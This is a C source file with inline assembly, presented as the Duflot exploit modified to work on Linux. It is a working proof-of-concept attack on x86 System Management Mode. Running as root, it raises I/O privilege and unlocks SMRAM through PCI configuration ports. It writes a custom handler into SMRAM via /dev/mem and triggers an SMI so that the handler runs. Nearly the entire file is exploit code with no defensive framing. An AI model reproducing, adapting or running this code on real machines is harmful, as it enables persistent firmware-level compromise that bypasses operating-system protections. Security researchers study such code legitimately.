/* Duflot exploit just modified to work on Linux */ 

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/io.h>
#include <errno.h>

#define MEMDEV "/dev/mem"

extern char handler[], endhandler[];

/* This is our SMM handler */
asm (
        ".data\n"
        ".code16\n"
        ".globl handler, endhandler\n"
        "\n"
        "handler:\n"
        "       addr32 mov $test, %eax\n"    /* Set protected mode return */
        "       mov %eax, %cs:0xfff0\n"      /* address to test()         */
        "       mov $0x0, %ax\n"
        "       mov %ax, %ds\n"              /* DS = 0 */
        "       rsm\n"                       /* Switch back to protected mode
*/        "endhandler:\n"
        "\n"
        ".text\n"
        ".code32\n"
);

/*
 * In SMM we change the  saved EIP value so that we return to our test()
 * function.
 * This function is never explicitely called -- it is only executed upon
 * successful return from SMM mode.
 */
void test(void)
{
        printf("Function test executed -- it works!\n");
        exit(EXIT_SUCCESS);
}

/*
 * This is our main() function
 */
int main(void)
{
        int fd;
        unsigned char *vidmem;
        unsigned int data1 = 0x8000009c;
        unsigned int data2 = 0x00384a00;
        unsigned int data3 = 0x00380a00;

        /* Raise IOPL to 3 to open all I/O ports */
        if(iopl(3) < 0) {
                printf("Calling iopl(3) failed, errno is %d\n", errno);
                exit(EXIT_FAILURE);
        } else {
                printf("Successfully called iopl(3)\n");
        }

        /* Open SMRAM access (interferes with X server) */
        outl(data1, 0xcf8);
        outl(data2, 0xcfc);
        printf("Successfully opened SMRAM (no segfault ...)\n");

        /* Map SMM handler code (0xa8000-Oxa8fff) in our address space */
        if ( (fd = open(MEMDEV, O_RDWR)) < 0 ) {
		perror("\nopen");
                exit(EXIT_FAILURE);
        } else {
                printf("Successfully called open(%s, O_RDWR)\n", MEMDEV);
        }

        if ( (vidmem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                        fd, 0xa8000) ) == MAP_FAILED ) {
                printf("Calling mmap(...) failed, errno is %d\n", errno);
                exit(EXIT_FAILURE);
        } else {
                printf("Successfully called mmap\n");
        }
        close(fd);

        /* Upload custom-made handler in SMRAM */
        memcpy(vidmem, handler, endhandler-handler);
        printf("Successfully called memcpy (no segfault...)\n");

        /* Release SMM handler memory mapping */
        if(munmap(vidmem, 4096) < 0) {
                printf("Calling munmap(...) failed, errno is %d\n", errno);
                exit(EXIT_FAILURE);
        } else {
                printf("munmap successfully executed\n");
        }

        /* Close SMRAM access */
        outl(data1, 0xcf8);
        outl(data3, 0xcfc);
        printf("Successfully closed SMRAM (no segfault ...)\n");

        /* Trigger a SMI -- this should execute the new SMM handler */
        outl(0x0000000f, 0xb2);
        printf("Successfully triggered something.... (no segfault ...)\n");

        /* The following should not be executed -- SMM handler returns to
         * test()...
         */
        printf("Function test not executed -- failure\n");
        exit(EXIT_FAILURE);
}
